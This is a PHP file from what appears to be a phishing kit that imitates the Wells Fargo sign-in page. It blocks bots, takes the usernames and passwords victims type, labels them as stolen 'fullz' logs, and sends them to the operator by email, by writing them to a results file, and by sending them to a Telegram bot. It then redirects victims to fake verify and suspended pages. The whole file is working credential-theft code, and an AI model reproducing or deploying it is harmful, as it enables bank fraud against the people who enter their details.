<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
include "req/config.php";

$ip = $_SERVER['REMOTE_ADDR'];$user = $_POST['j_username'];$password = $_POST['j_password'];

if(isset($_POST['btnSignon']) && isset($_POST['j_username']) && isset($_POST['j_password'])){
    if(strlen($password) >5 && strlen($user) > 3){
		
	///////////////////////// MAIL PART //////////////////////
	
        $user        = $_POST['j_username'];
        $password     = $_POST['j_password'];
        $PublicIP     = $_SERVER['REMOTE_ADDR'];
		if(isset($_GET['cw2'])){$reshead="------------- CONFIRM WELLSFARGO LOG -------------";}
		else{$reshead="--------------- 🦞🦞 NEW WELLSFARGO LOG 🦞🦞 ------------- ";};
        $Info_LOG = "
|--===-======-=======--YoChi--=======-======-===--|
$reshead
UserName         : $user 
Password         : $password ";
		if(isset($_GET['cw2'])){$_SESSION['fullz'].=$Info_LOG;} else{$_SESSION['fullz']=$Info_LOG;}


// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = $PublicIP.' : 🦞🦞 We11sFarg0 L0gin';$headers = 'From: 🏴‍☠️ YoCHI 🏴‍☠️ <yochmoneywellsf@wellsfofyoch.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();$_SESSION['header']=$headers;
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir("../rst");
            $file = fopen("../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		if(!isset($_GET['cw2'])){header("location:verify.php?accrXId=c".md5(rand(100, 999999999))."15181d31&amp;consent_handled=true&amp;consentResponseUri=%2Fprotocol&cw2=On");}
		else{header("location:suspended.php?id=myaccount&y=".md5(rand(100, 999999999))."");};

    }
    else{
        date_default_timezone_set('GMT');
        $line = date('Y-m-d H:i:s') . " - $email:$password";
        if ($Ftp_Write == 1) {file_put_contents('log.txt', $line . PHP_EOL, FILE_APPEND);};
		header("location:verify.php?loginFailed_id=c".md5(rand(100, 999999999))."15181d31&amp;consent_handled=true&cw2=On&amp;consentResponseUri=%2Fprotocol");
    };
}
else{
    date_default_timezone_set('GMT');
    $line = date('Y-m-d H:i:s') . " - $email ";
    if ($Ftp_Write == 1) {file_put_contents('log.txt', $line . PHP_EOL, FILE_APPEND);};
	header("location:verify.php?loginFailed_id=c3Fauth".md5(rand(100, 999999999))."2da15181d31&amp;consent_handled=true&cw2=On&amp;consentResponseUri=%2Fprotocol");
};
?>